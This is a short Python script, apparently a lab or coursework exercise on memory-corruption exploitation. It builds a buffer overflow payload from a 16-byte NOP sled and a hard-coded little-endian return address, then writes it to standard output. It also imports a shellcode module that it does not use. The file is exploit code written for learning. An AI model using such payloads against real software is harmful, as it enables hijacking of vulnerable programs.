import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
nops = b"\x90" * 16;
payload = nops + pack("<I", 0x0804a25d)


# Launch the attack!
sys.stdout.buffer.write(payload)
